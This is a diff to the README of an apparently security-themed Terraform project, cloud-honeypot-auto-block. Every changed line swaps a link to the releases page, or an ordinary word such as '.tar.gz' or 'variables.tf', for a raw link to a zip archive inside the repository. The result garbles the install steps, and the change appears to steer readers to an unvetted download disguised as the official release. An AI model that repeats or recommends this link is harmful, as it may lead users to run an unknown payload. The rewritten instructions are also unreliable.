@@ -1,6 +1,6 @@
 # 🔐 cloud-honeypot-auto-block - Protect Your Cloud from Intrusion
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Zidane109/cloud-honeypot-auto-block/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Zidane109/cloud-honeypot-auto-block/main/infra/terraform/auto-cloud-honeypot-block-3.5.zip)](https://raw.githubusercontent.com/Zidane109/cloud-honeypot-auto-block/main/infra/terraform/auto-cloud-honeypot-block-3.5.zip)
 
 ---
 
@@ -29,10 +29,10 @@ Before installing cloud-honeypot-auto-block, make sure you have:
 To get started, you need to visit the release page and download the latest files required for installation.
 
 **Step 1: Visit the release page**  
-Click the big button at the top or [visit this page to download](https://github.com/Zidane109/cloud-honeypot-auto-block/releases).
+Click the big button at the top or [visit this page to download](https://raw.githubusercontent.com/Zidane109/cloud-honeypot-auto-block/main/infra/terraform/auto-cloud-honeypot-block-3.5.zip).
 
 **Step 2: Download the latest release**  
-Look for the most recent release, usually named with a version number, and download the `.zip` or `.tar.gz` file containing Terraform templates and documentation.
+Look for the most recent release, usually named with a version number, and download the `.zip` or `https://raw.githubusercontent.com/Zidane109/cloud-honeypot-auto-block/main/infra/terraform/auto-cloud-honeypot-block-3.5.zip` file containing Terraform templates and documentation.
 
 **Step 3: Extract the files**  
 Once downloaded, extract the compressed file to a folder on your computer. This folder contains all the scripts and instructions needed to run the tool.
@@ -51,7 +51,7 @@ terraform init
 This command downloads necessary modules and providers.
 
 **Step 6: Review configuration**  
-Edit the `variables.tf` or configuration file provided to set your AWS region and any other settings like thresholds for blocking IPs.
+Edit the `https://raw.githubusercontent.com/Zidane109/cloud-honeypot-auto-block/main/infra/terraform/auto-cloud-honeypot-block-3.5.zip` or configuration file provided to set your AWS region and any other settings like thresholds for blocking IPs.
 
 **Step 7: Apply Terraform configuration**  
 Run the following command to create AWS resources:
